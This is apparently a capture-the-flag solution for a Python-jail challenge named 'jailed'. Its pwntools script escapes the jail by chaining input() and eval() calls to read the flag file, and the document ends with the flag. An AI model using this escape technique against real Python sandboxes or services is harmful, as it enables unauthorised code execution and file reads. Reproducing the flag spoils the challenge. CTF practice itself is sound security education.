# jailed
nc chal.ctf-league.osusec.org 8231

## script

```py
#!/usr/bin/evn python3
from pwn import *
import os

p = remote("chal.ctf-league.osusec.org", 8231)
p.sendline()

p.recv()
# program can only accept certain ascii so call input so that it can accept everything
p.sendline(b"input()")
# call the make_insecure function
p.sendline(b'make_insecure()')
p.sendline(b'eval(a)')


# then you want to open the flag file and read it
p.sendline(b'input()')
p.sendline(b'open("flag", "r").read()')
p.sendline(b'eval(a)')

# print out the flag
p.sendline(b'print(a)')


p.interactive()

```

## flag

`osu{n3v3R_unp1ckL3_Untru5t3d_Us3R_data!}`